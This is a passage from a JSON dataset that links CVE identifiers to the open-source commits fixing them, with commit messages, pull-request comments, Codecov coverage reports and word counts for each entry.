[...rip/framework/apollo/core/signature/Signature.java](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree#diff-YXBvbGxvLWNvcmUvc3JjL21haW4vamF2YS9jb20vY3RyaXAvZnJhbWV3b3JrL2Fwb2xsby9jb3JlL3NpZ25hdHVyZS9TaWduYXR1cmUuamF2YQ==) | `80.00% <100.00%> (\u00f8)` | `3.00 <0.00> (\u00f8)` | |\n| [...o/openapi/filter/ConsumerAuthenticationFilter.java](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree#diff-YXBvbGxvLXBvcnRhbC9zcmMvbWFpbi9qYXZhL2NvbS9jdHJpcC9mcmFtZXdvcmsvYXBvbGxvL29wZW5hcGkvZmlsdGVyL0NvbnN1bWVyQXV0aGVudGljYXRpb25GaWx0ZXIuamF2YQ==) | `94.11% <100.00%> (\u00f8)` | `4.00 <0.00> (\u00f8)` | |\n| ... and [5 more](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree-more) | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/ctripcorp/apollo/pull/3233?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/ctripcorp/apollo/pull/3233?src=pr&el=footer). Last update [8c5d79f...ae9ba6c](https://codecov.io/gh/ctripcorp/apollo/pull/3233?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 7,
            "comments_words": 230,
            "total_other_info_words": 237
        },
        {
            "cve-id": "CVE-2020-13921",
            "commit_url": "https://github.com/apache/skywalking/commit/ddb6d9a5019a9c1fe31c364485a4e4b5066fefc3",
            "commit_msg": "fix fuzzy query sql injection",
            "commit_msg_words": 5,
            "other_info": "fix fuzzy query sql injection # [Codecov](https://codecov.io/gh/apache/skywalking/pull/4970?src=pr&el=h1) Report\n> Merging [#4970](https://codecov.io/gh/apache/skywalking/pull/4970?src=pr&el=desc) into [master](https://codecov.io/gh/apache/skywalking/commit/cc9ea271a720e8def161a583595f75da9bda77a5&el=desc) will **increase** coverage by `0.00%`.\n> The diff coverage is `0.00%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/apache/skywalking/pull/4970/graphs/tree.svg?width=650&height=150&src=pr&token=qrILxY5yA8)](https://codecov.io/gh/apache/skywalking/pull/4970?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff            @@\n##             master    #4970   +/-   ##\n=========================================\n  Coverage     53.60%   53.61%           \n- Complexity     2940     2942    +2     \n=========================================\n  Files          1392     1392           \n  Lines         30168    30173    +5     \n  Branches       3366     3366           \n=========================================\n+ Hits          16172    16177    +5     \n  Misses        13211    13211           \n  Partials        785      785           \n```\n\n\n| [Impacted Files](https://codecov.io/gh/apache/skywalking/pull/4970?src=pr&el=tree) | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| [...er/storage/plugin/jdbc/h2/dao/H2AlarmQueryDAO.java](https://codecov.io/gh/apache/skywalking/pull/4970/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItc3RvcmFnZS1wbHVnaW4vc3RvcmFnZS1qZGJjLWhpa2FyaWNwLXBsdWdpbi9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvc2t5d2Fsa2luZy9vYXAvc2VydmVyL3N0b3JhZ2UvcGx1Z2luL2pkYmMvaDIvZGFvL0gyQWxhcm1RdWVyeURBTy5qYXZh) | `6.66% <0.00%> (-0.16%)` | `1.00 <0.00> (\u00f8)` | |\n| [...storage/plugin/jdbc/h2/dao/H2MetadataQueryDAO.java](https://codecov.io/gh/apache/skywalking/pull/4970/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItc3RvcmFnZS1wbHVnaW4vc3RvcmFnZS1qZGJjLWhpa2FyaWNwLXBsdWdpbi9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvc2t5d2Fsa2luZy9vYXAvc2VydmVyL3N0b3JhZ2UvcGx1Z2luL2pkYmMvaDIvZGFvL0gyTWV0YWRhdGFRdWVyeURBTy5qYXZh) | `50.00% <0.00%> (-0.69%)` | `12.00 <0.00> (\u00f8)` | |\n| [...er/storage/plugin/jdbc/h2/dao/H2TraceQueryDAO.java](https://codecov.io/gh/apache/skywalking/pull/4970/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItc3RvcmFnZS1wbHVnaW4vc3RvcmFnZS1qZGJjLWhpa2FyaWNwLXBsdWdpbi9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvc2t5d2Fsa2luZy9vYXAvc2VydmVyL3N0b3JhZ2UvcGx1Z2luL2pkYmMvaDIvZGFvL0gyVHJhY2VRdWVyeURBTy5qYXZh) | `38.77% <0.00%> (-0.40%)` | `6.00 <0.00> (\u00f8)` | |\n| [.../storage/plugin/jdbc/mysql/MySQLAlarmQueryDAO.java](https://codecov.io/gh/apache/skywalking/pull/4970/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItc3RvcmFnZS1wbHVnaW4vc3RvcmFnZS1qZGJjLWhpa2FyaWNwLXBsdWdpbi9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvc2t5d2Fsa2luZy9vYXAvc2VydmVyL3N0b3JhZ2UvcGx1Z2luL2pkYmMvbXlzcWwvTXlTUUxBbGFybVF1ZXJ5REFPLmphdmE=) | `6.81% <0.00%> (-0.16%)` | `1.00 <0.00> (\u00f8)` | |\n| [...r/storage/plugin/influxdb/query/MetadataQuery.java](https://codecov.io/gh/apache/skywalking/pull/4970/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItc3RvcmFnZS1wbHVnaW4vc3RvcmFnZS1pbmZsdXhkYi1wbHVnaW4vc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL3NreXdhbGtpbmcvb2FwL3NlcnZlci9zdG9yYWdlL3BsdWdpbi9pbmZsdXhkYi9xdWVyeS9NZXRhZGF0YVF1ZXJ5LmphdmE=) | `60.00% <0.00%> (+0.76%)` | `12.00% <0.00%> (+1.00%)` | |\n| [...er/storage/plugin/influxdb/query/MetricsQuery.java](https://codecov.io/gh/apache/skywalking/pull/4970/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItc3RvcmFnZS1wbHVnaW4vc3RvcmFnZS1pbmZsdXhkYi1wbHVnaW4vc3JjL21haW4vamF2YS9vcmcvYXBhY2hlL3NreXdhbGtpbmcvb2FwL3NlcnZlci9zdG9yYWdlL3BsdWdpbi9pbmZsdXhkYi9xdWVyeS9NZXRyaWNzUXVlcnkuamF2YQ==) | `51.66% <0.00%> (+0.83%)` | `11.00% <0.00%> (+1.00%)` | |\n| [...g/oap/server/telemetry/prometheus/BaseMetrics.java](https://codecov.io/gh/apache/skywalking/pull/4970/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItdGVsZW1ldHJ5L3RlbGVtZXRyeS1wcm9tZXRoZXVzL3NyYy9tYWluL2phdmEvb3JnL2FwYWNoZS9za3l3YWxraW5nL29hcC9zZXJ2ZXIvdGVsZW1ldHJ5L3Byb21ldGhldXMvQmFzZU1ldHJpY3MuamF2YQ==) | `87.09% <0.00%> (+3.22%)` | `9.00% <0.00%> (+1.00%)` | |\n| [...core/analysis/manual/instance/InstanceTraffic.java](https://codecov.io/gh/apache/skywalking/pull/4970/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItY29yZS9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvc2t5d2Fsa2luZy9vYXAvc2VydmVyL2NvcmUvYW5hbHlzaXMvbWFudWFsL2luc3RhbmNlL0luc3RhbmNlVHJhZmZpYy5qYXZh) | `60.00% <0.00%> (+4.00%)` | `7.00% <0.00%> (\u00f8%)` | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/apache/skywalking/pull/4970?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/apache/skywalking/pull/4970?src=pr&el=footer). Last update [cc9ea27...2acc6bd](https://codecov.io/gh/apache/skywalking/pull/4970?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).\n Look like e2e don't passed. > Look like e2e don't passed.\r\n\r\nConnection to the maven repo is reset, although I've retried several times, should not be related to the changes @JaredTan95 As these two fuzzy query not included in the e2e, please check locally.",
            "pr_title_words": 5,
            "comments_words": 259,
            "total_other_info_words": 264
        },
        {
            "cve-id": "CVE-2020-29394",
            "commit_url": "https://github.com/COVESA/dlt-daemon/commit/25703a5cdbf3067ca4d4e75a0229762855548ecc",
            "commit_msg": "fscanf() uses dynamic formatting to prevent buffer overflow\n\nCVE: CVE-2020-29394\n\nSigned-off-by: KHANH LUONG HONG DUY <khanh.luonghongduy@vn.bosch.com>",
            "commit_msg_words": 16,
            "other_info": "fscanf() uses dynamic formatting to prevent buffer overflow",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2020-36282",
            "commit_url": "https://github.com/rabbitmq/rabbitmq-jms-client/commit/f647e5dbfe055a2ca8cbb16dd70f9d50d888b638",
            "commit_msg": "Use trusted packages in StreamMessage\n\nStreamMessage now uses the same \"white list\" mechanism as\nObjectMessage to avoid some arbitrary code execution on deserialization.\n\nEven though StreamMessage is supposed to handle only primitive types,\nit is still to possible to send a message that contains an arbitrary\nserializable instance. The consuming application application may\nthen execute code from this class on deserialization.\n\nThe fix consists in using the list of trusted packages that can be\nset at the connection factory level.\n\nFixes #135",
            "commit_msg_words": 82,
            "other_info": "Use trusted packages in StreamMessage",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2020-8112",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/05f9b91e60debda0e83977e5e63b2e66486f7074",
            "commit_msg": "opj_tcd_init_tile(): avoid integer overflow\n\nThat could lead to later assertion failures.\n\nFixes #1231 / CVE-2020-8112",
            "commit_msg_words": 15,
            "other_info": "opj_tcd_init_tile(): avoid integer overflow I can confirm with makes UBSAN and ASAN happy for the given problematic input.",
            "pr_title_words": 4,
            "comments_words": 14,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2020-14931",
            "commit_url": "https://github.com/jaygreig86/dmitry/commit/da1fda491145719ae15dd36dd37a69bdbba0b192",
            "commit_msg": "Do not let frmtdbuff overflow in nic_format_buff.",
            "commit_msg_words": 7,
            "other_info": "Do not let frmtdbuff overflow in nic_format_buff.",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-4032",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/e7bffa64ef5ed70bac94f823e2b95262642f5296",
            "commit_msg": "Fixed OOB read in update_recv_secondary_order\n\nCVE-2020-4032 thanks to @antonio-morales for finding this.",
            "commit_msg_words": 12,
            "other_info": "Fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5060/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5061/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5062/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5063/",
            "pr_title_words": 1,
            "comments_words": 56,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2020-15475",
            "commit_url": "https://github.com/ntop/nDPI/commit/6a9f5e4f7c3fd5ddab3e6727b071904d76773952",
            "commit_msg": "Fixed use after free caused by dangling pointer\n\n * This fix also improved RCE Injection detection\n\nSigned-off-by: Toni Uhlig <matzeton@googlemail.com>",
            "commit_msg_words": 20,
            "other_info": "Fixed use after free caused by dangling pointer Thank you",
            "pr_title_words": 8,
            "comments_words": 2,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2020-24301",
            "commit_url": "https://github.com/hapifhir/hapi-fhir/commit/adb3734fcbbf9a9165445e9ee5eef168dbcaedaf",
            "commit_msg": "Resolve XSS vulnerability",
            "commit_msg_words": 3,
            "other_info": "Fix TestpageOverlay XSS Vulnerability # [Codecov](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027?src=pr&el=h1) Report\n> Merging [#2027](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027?src=pr&el=desc) into [master](https://codecov.io/gh/jamesagnew/hapi-fhir/commit/63ef2ce00630e6aede5d8d782c63484d55fa2f9e&el=desc) will **decrease** coverage by `0.00%`.\n> The diff coverage is `0.00%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027/graphs/tree.svg?width=650&height=150&src=pr&token=zHfnKfQB9X)](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027?src=pr&el=tree)\n\n```diff\n@@             Coverage Diff              @@\n##             master    #2027      +/-   ##\n============================================\n- Coverage     80.94%   80.93%   -0.01%     \n  Complexity    15815    15815              \n============================================\n  Files          1119     1119              \n  Lines         58927    58933       +6     \n  Branches       9043     9045       +2     \n============================================\n+ Hits          47696    47699       +3     \n- Misses         7733     7737       +4     \n+ Partials       3498     3497       -1     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027?src=pr&el=tree) | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| [...r-base/src/main/java/ca/uhn/fhir/util/UrlUtil.java](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027/diff?src=pr&el=tree#diff-aGFwaS1maGlyLWJhc2Uvc3JjL21haW4vamF2YS9jYS91aG4vZmhpci91dGlsL1VybFV0aWwuamF2YQ==) | `72.76% <0.00%> (-2.11%)` | `67.00 <0.00> (\u00f8)` | |\n| [.../fhir/jpa/empi/broker/EmpiQueueConsumerLoader.java](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027/diff?src=pr&el=tree#diff-aGFwaS1maGlyLWpwYXNlcnZlci1lbXBpL3NyYy9tYWluL2phdmEvY2EvdWhuL2ZoaXIvanBhL2VtcGkvYnJva2VyL0VtcGlRdWV1ZUNvbnN1bWVyTG9hZGVyLmphdmE=) | `57.14% <0.00%> (-14.29%)` | `3.00% <0.00%> (-1.00%)` | |\n| [...n/fhir/jpa/config/HapiFhirHibernateJpaDialect.java](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027/diff?src=pr&el=tree#diff-aGFwaS1maGlyLWpwYXNlcnZlci1iYXNlL3NyYy9tYWluL2phdmEvY2EvdWhuL2ZoaXIvanBhL2NvbmZpZy9IYXBpRmhpckhpYmVybmF0ZUpwYURpYWxlY3QuamF2YQ==) | `90.32% <0.00%> (+16.12%)` | `13.00% <0.00%> (+1.00%)` | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027?src=pr&el=footer). Last update [63ef2ce...95ea3df](https://codecov.io/gh/jamesagnew/hapi-fhir/pull/2027?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 4,
            "comments_words": 160,
            "total_other_info_words": 164
        },
        {
            "cve-id": "CVE-2020-36619",
            "commit_url": "https://github.com/EliasOenal/multimon-ng/commit/e5a51c508ef952e81a6da25b43034dd1ed023c07",
            "commit_msg": "Remove uncontrolled format string vulnerability",
            "commit_msg_words": 5,
            "other_info": "139 characters missing from flex Thanks a lot for the PR. I just have a small additional request: Given that this is a non-trivial change and contribution, would you mind adding your name (and optionally your email) to the source file? Establishing correct authorship and verifying the licensing is important to some distributions (e.g. Debian) and I would not want to cause issues in their packaging process. Can do, just saw this. I'm glad that this is useful.  Authorship added Fixes #159",
            "pr_title_words": 5,
            "comments_words": 77,
            "total_other_info_words": 82
        },
        {
            "cve-id": "CVE-2020-18378",
            "commit_url": "https://github.com/WebAssembly/binaryen/commit/766ff5108464161887dbcd209033c303bcff432c",
            "commit_msg": "fix a fuzz bug with peeking forward in binary reading. fixes #1900",
            "commit_msg_words": 12,
            "other_info": "Fix a fuzz bug with peeking forward in binary reading.",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2020-11097",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/58a3122250d54de3a944c487776bcd4d1da4721e",
            "commit_msg": "Fixed OOB read in ntlm_av_pair_get\n\nCVE-2020-11097 thanks to @antonio-morales for finding this.",
            "commit_msg_words": 12,
            "other_info": "Fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5060/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5061/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5062/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5063/",
            "pr_title_words": 1,
            "comments_words": 56,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2020-36254",
            "commit_url": "https://github.com/mkj/dropbear/commit/8f8a3dff705fad774a10864a2e3dbcfa9779ceff",
            "commit_msg": "scp.c: Port OpenSSH CVE-2018-20685 fix (#80)",
            "commit_msg_words": 6,
            "other_info": "scp.c: Port OpenSSH CVE-2018-20685 fix Also, original commit from OpenSSH is https://github.com/openssh/openssh-portable/commit/6010c0303a422a9c5fa8860c061bf7105eb7f8b2 This has a separate CVE id assigned (CVE-2020-36254)",
            "pr_title_words": 5,
            "comments_words": 15,
            "total_other_info_words": 20
        },
        {
            "cve-id": "CVE-2020-26154",
            "commit_url": "https://github.com/libproxy/libproxy/commit/4411b523545b22022b4be7d0cac25aa170ae1d3e",
            "commit_msg": "Fix buffer overflow when PAC is enabled\n\nThe bug was found on Windows 10 (MINGW64) when PAC is enabled. It turned\nout to be the large PAC file (more than 102400 bytes) returned by a\nlocal proxy program with no content-length present.",
            "commit_msg_words": 42,
            "other_info": "Fix buffer overflow when PAC is enabled I'll encourage you to request a CVE for this issue using https://cveform.mitre.org/. > I'll encourage you to request a CVE for this issue using https://cveform.mitre.org/.\r\n\r\n[CVE-2020-26154](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26154) was assigned by MITRE to this issue. Is this patch going to get merged? hey, when will the patch be merged? or what would be the manual way applying this patch? it is assigned as a critical vulnerability",
            "pr_title_words": 7,
            "comments_words": 64,
            "total_other_info_words": 71
        },
        {
            "cve-id": "CVE-2020-15389",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/e8e258ab049240c2dd1f1051b4e773b21e2d3dc0",
            "commit_msg": "opj_decompress: fix double-free on input directory with mix of valid and invalid images (CVE-2020-15389)\n\nFixes #1261\n\nCredits to @Ruia-ruia for reporting and analysis.",
            "commit_msg_words": 23,
            "other_info": "opj_decompress: fix double-free on input directory with mix of valid and invalid images @Ruia-ruia are you requesting a CVE number ? If so, provide it to me so I can tag the commit message with it. If not, I'll just merge that as it",
            "pr_title_words": 13,
            "comments_words": 31,
            "total_other_info_words": 44
        },
        {
            "cve-id": "CVE-2020-11058",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/3627aaf7d289315b614a584afb388f04abfb5bbf",
            "commit_msg": "Fixed #6011: Bounds check in rdp_read_font_capability_set",
            "commit_msg_words": 6,
            "other_info": "Fix issues with boundary access. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4756/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4757/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4758/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4759/\n @hardening will address your comments in a separate PR, I think better merge this now as it is already big enough. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4766/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4767/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4768/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4769/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4770/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4771/",
            "pr_title_words": 5,
            "comments_words": 161,
            "total_other_info_words": 166
        },
        {
            "cve-id": "CVE-2020-12887",
            "commit_url": "https://github.com/mjurczak/mbed-coap/commit/4647a68e364401e81dbd370728127d844f221d93",
            "commit_msg": "Implemented measures to prevent memory leaks in sn_coap_parser_options_parse().\n\nAdded a helper uint16_t addition function with overflow detection. The function is used when calculating the extended length and option delta. The overlow detection is needed to avoid wrap-around of option number or length.\nAdditional checks in options using sn_coap_parser_options_parse_multiple_options() have been implemented to avoid overwriting of pointers pointing to previously allocated memory.",
            "commit_msg_words": 61,
            "other_info": "Implemented measures to prevent memory leaks",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2020-10576",
            "commit_url": "https://github.com/meetecho/janus-gateway/commit/eb99ac8674c554bab6775f4378b24e991b4a2fa1",
            "commit_msg": "Fixes to leaks and race conditions in VoiceMail plugin",
            "commit_msg_words": 9,
            "other_info": "Fixes to leaks and race conditions in VoiceMail plugin Merging.",
            "pr_title_words": 9,
            "comments_words": 1,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2020-10232",
            "commit_url": "https://github.com/sleuthkit/sleuthkit/commit/459ae818fc8dae717549810150de4d191ce158f1",
            "commit_msg": "Fix stack buffer overflow in yaffsfs_istat\n\nPrevent a stack buffer overflow in yaffsfs_istat by increasing the buffer size to the size required by tsk_fs_time_to_str.",
            "commit_msg_words": 24,
            "other_info": "Fix stack buffer overflow in yaffsfs_istat If possible, I would like to create a security advisory for this on GitHub to request a CVE and inform other projects that import this functionality. Any way that a maintainer can create a draft security advisory for this vulnerability? I\u2019m happy to fill in the details, but a maintainer will need to create the draft and publish it once completed. This appears to be [CVE-2020-10232](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10232).",
            "pr_title_words": 6,
            "comments_words": 66,
            "total_other_info_words": 72
        },
        {
            "cve-id": "CVE-2020-14983",
            "commit_url": "https://github.com/chocolate-doom/chocolate-doom/commit/f1a8d991aa8a14afcb605cf2f65cd15fda204c56",
            "commit_msg": "net: fix missing server-side num_players validation (CVE-2020-14983)\n\nThe server in Chocolate Doom 3.0.0 and Crispy Doom 5.8.0 doesn't\nvalidate the user-controlled num_players value, leading to a buffer\noverflow. A malicious user can overwrite the server's stack.\n\nFixes CVE-2020-14983, found by Micha\u0142 Dardas from LogicalTrust.\n\nFixes: #1293.",
            "commit_msg_words": 46,
            "other_info": "CVE-2020-14983 Thanks for taking care of this. I'm going to do a 3.0.1 patch release with the fix. Would 3.1.0 make sense at this time, instead? In my opinion, it makes sense because the previous release was more than two years ago and the development speed didn't slow down. There were also changes to the multiplayer code which results in difficulty in setuping a game between the latest release and the bleeding edge version.  I want to do a 3.1.0 release anyway in the near future - it's been long enough.",
            "pr_title_words": 1,
            "comments_words": 90,
            "total_other_info_words": 91
        },
        {
            "cve-id": "CVE-2020-13623",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/a096da74c2c753b83daa61c1c807ec43de287917",
            "commit_msg": "Add stack limit check to proxy operations\n\nFixes #3785.\n\nJerryScript-DCO-1.0-Signed-off-by: D\u00e1niel B\u00e1tyai dbatyai@inf.u-szeged.hu",
            "commit_msg_words": 13,
            "other_info": "Add stack limit check to proxy operations",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-11089",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/6b485b146a1b9d6ce72dfd7b5f36456c166e7a16",
            "commit_msg": "Fixed oob read in irp_write and similar",
            "commit_msg_words": 7,
            "other_info": "Cve again attributed \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4911/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4914/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4915/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4917/",
            "pr_title_words": 3,
            "comments_words": 56,
            "total_other_info_words": 59
        },
        {
            "cve-id": "CVE-2020-14397",
            "commit_url": "https://github.com/LibVNC/libvncserver/commit/38e98ee61d74f5f5ab4aa4c77146faad1962d6d0",
            "commit_msg": "libvncserver: add missing NULL pointer checks",
            "commit_msg_words": 6,
            "other_info": "Add NULL pointer checks + other minor security improvements",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2020-19861",
            "commit_url": "https://github.com/NLnetLabs/ldns/commit/136ec420437041fe13f344a2053e774f9050cc38",
            "commit_msg": "* bugfix #51: Heap Out-of-bound Read vulnerability in\n  ldns_nsec3_salt_data reported by pokerfacett.",
            "commit_msg_words": 12,
            "other_info": "Prepare for 1.8.0 release",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2020-28248",
            "commit_url": "https://github.com/gemini-testing/png-img/commit/14ac462a32ca4b3b78f56502ac976d5b0222ce3d",
            "commit_msg": "Handle image size overflow",
            "commit_msg_words": 4,
            "other_info": "Handle image size overflow",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2020-36635",
            "commit_url": "https://github.com/openmrs/openmrs-module-appointmentscheduling/commit/34213c3f6ea22df427573076fb62744694f601d8",
            "commit_msg": "RA-1772: Fix stored xss is appointment scheduling (#32)",
            "commit_msg_words": 8,
            "other_info": "RA-1772: Fix stored xss in appointment scheduling Thanks, finally getting to this @isears , looks good to me I think we are fine to merge!",
            "pr_title_words": 7,
            "comments_words": 18,
            "total_other_info_words": 25
        },
        {
            "cve-id": "CVE-2020-12443",
            "commit_url": "https://github.com/bigbluebutton/bigbluebutton/commit/b21ca8355a57286a1e6df96984b3a4c57679a463",
            "commit_msg": "Return 404 error when the file download is not allowed.",
            "commit_msg_words": 10,
            "other_info": "Return 404 error when presentation file download is not allowed. Hello Fred,\r\nThanks for your hard-working and up-to-date system,\r\nI implemented bbb on two completely separate servers with the same settings, the only differences between the two systems are the domain name and the internal IP address.\r\nOne of the servers uses version 2.2.5 and I updated the second server to 2.2.6 yesterday.\r\nThere is a problem with the second server after the update. When I download the slide during the room session, I get a 404 error from Tomcat, while the previous version didn't have this problem. I think this problem is caused by the change you have made on this update. what is your opinion? Hi again,\r\n\r\nYou can check demo.bigbluebutton.com, and this problem occurs on your demo site too.\r\n\r\nI found the bbb-web logs:\r\n\r\nERROR o.b.api.RecordingService - Cannot find file for file.pdf\r\nWARN  o.b.w.c.PresentationController - null does not exist.\r\n\r\nI think you should not use getCanonicalPath for all systems.\r\nbecause it can be a shortcut from another Drive (as you explained in the documentation: [Move recordings to a different partition](https://docs.bigbluebutton.org/2.2/customize.html#move-recordings-to-a-different-partition)) it may occur a failure like this.\r\n\r\nbest. Thanks for reporting. We're looking at other ways to make this work.",
            "pr_title_words": 10,
            "comments_words": 193,
            "total_other_info_words": 203
        },
        {
            "cve-id": "CVE-2020-11945",
            "commit_url": "https://github.com/squid-cache/squid/commit/eeebf0f37a72a2de08348e85ae34b02c34e9a811",
            "commit_msg": "Fix auth digest refcount integer overflow (#585)\n\nThis fixes a possible overflow of the nonce reference counter in the\ndigest authentication scheme, found by security researchers\n@synacktiv.\n\nIt changes `references` to be an 64 bits unsigned integer. This makes\noverflowing the counter impossible in practice.",
            "commit_msg_words": 45,
            "other_info": "V4 next backports Can one of the admins verify this patch? OK to test",
            "pr_title_words": 3,
            "comments_words": 11,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2020-1887",
            "commit_url": "https://github.com/osquery/osquery/commit/3ae9a09e14193a9c0a81c38dd3fef4c2fe38966e",
            "commit_msg": "http_client: Add missing certificate hostname verification\n\nBefore this commit it was possible to have osquery accept\na valid certificate with a wrong hostname.\nThe commit fixes this adding the hostname verification.\n\nMoreover:\n\n- Regenerate test CA, server certificates and keys, so that\n  the CA key is available, to be able to sign other test certs.\n- Add a regression test for the hostname verification bug.\n\nCo-Authored-By: Alessandro Gario <alessandro.gario@gmail.com>",
            "commit_msg_words": 69,
